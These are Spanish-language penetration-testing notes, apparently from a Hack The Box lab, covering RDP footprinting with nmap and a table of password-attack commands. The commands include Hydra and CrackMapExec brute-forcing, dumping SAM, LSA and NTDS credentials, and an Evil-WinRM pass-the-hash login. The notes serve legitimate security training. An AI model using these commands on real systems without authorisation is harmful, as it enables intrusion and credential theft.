> El **Remote Desktop Protocol (RDP)** es un protocolo desarrollado por Microsoft para el acceso remoto a una computadora con el sistema operativo Windows. Este protocolo permite transmitir comandos de visualización y control a través de la interfaz gráfica de usuario (GUI) de forma cifrada sobre redes IP. RDP trabaja en la capa de aplicación del modelo de referencia TCP/IP, utilizando típicamente el puerto TCP 3389 como protocolo de transporte. Sin embargo, el protocolo UDP sin conexión también puede utilizar el puerto 3389 para administración remota.

Para establecer una sesión RDP, tanto el firewall de la red como el firewall del servidor deben permitir conexiones externas. Si se usa **Network Address Translation (NAT)** entre el cliente y el servidor, el equipo remoto necesita la dirección IP pública para acceder al servidor, y además se debe configurar el **port forwarding** en el router NAT hacia el servidor.

El servicio de **Escritorio Remoto** está instalado por defecto en los servidores Windows y no requiere aplicaciones externas adicionales. Este servicio puede ser activado mediante el Administrador del Servidor y tiene la configuración predeterminada para permitir conexiones solo a los hosts con **Autenticación a Nivel de Red (NLA)**.
### Footprinting a RDP

Escaneando el servicio RDP puede darnos mucha información sobre el host. Por ejemplo, podemos determinar si NLA está habilitado en el servidor o no, la versión de producto y el hostname.

#### Usando nmap

```shell-session
amr251@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET
Nmap scan report for 10.129.201.248
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

Además, podemos usar `--packet-trace` para seguir los paquetes individuales e inspeccionar su contenido de forma manual. Podemos ver que `RDP cookies` (`mstshash=nmap`) usado por nmap para interactuar con el servidor RDP puede ser identificado por cazadores de amenazas y varios servicios de seguridad como EDR, y pueden echarnos como pentesters en redes reforzadas. Un script denominado [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) ha sido desarrollado por Cisco y puede identificar las configuraciones de servidores RDP sin autenticarse mediante handshakes.

La autenticación a dichos servidores RDP puede realizarse de muchas formas. Por ejemplo, podemos conectarnos a servidores RDP desde Linux usando `xfreerdp`, `rdesktop`, o `Remmina` e interactuar con la GUI del servidor:

```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248 /dynamic-resolution
```

### RDP - Ataques a contraseñas

| **Command**                                                            | **Description**                                                                                                                                                                                          |
| ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `crackmapexec winrm <ip> -u user.list -p password.list`                | Usa CrackMapExec sobre WinRM para intentar hacer fuerza bruta en usuarios y contraseñas específicas                                                                                                      |
| `crackmapexec smb <ip> -u "user" -p "password" --shares`               | Usa CrackMapExec para enumerar shares SMB en un objetivo                                                                                                                                                 |
| `hydra -L user.list -P password.list <service>://<ip>`                 | Utiliza Hydra junto con una lista de usuarios y una lista de contraseñas para intentar descifrar una contraseña en el servicio especificado                                                              |
| `hydra -l username -P password.list <service>://<ip>`                  | Utiliza Hydra junto con una lista de nombres de usuario y contraseñas para intentar descifrar una contraseña en el servicio especificado.                                                                |
| `hydra -l user.list -p password <service>://<ip>`                      | Utiliza Hydra junto con una lista de usuarios y una contraseña para intentar descifrar una contraseña en el servicio especificado.                                                                       |
| `hydra -C <user_pass.list> ssh://<IP>`                                 | Utiliza Hydra junto con una lista de credenciales para intentar iniciar sesión en un objetivo a través del servicio especificado. Esto puede utilizarse para intentar un ataque de robo de credenciales. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Utiliza CrackMapExec junto con las credenciales de administrador para volcar los hashes de contraseñas almacenados en SAM a través de la red.                                                            |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Utiliza CrackMapExec junto con las credenciales de administrador para volcar secretos de LSA a través de la red. De esta manera, es posible obtener credenciales sin cifrar.                             |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds`             | Utiliza CrackMapExec junto con las credenciales de administrador para volcar hashes del archivo ntds a través de una red                                                                                 |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"`            | Utiliza Evil-WinRM para establecer una sesión de PowerShell con un objetivo de Windows mediante un hash de usuario y contraseña. Este es un tipo de ataque `Pass-The-Hash`.                              |

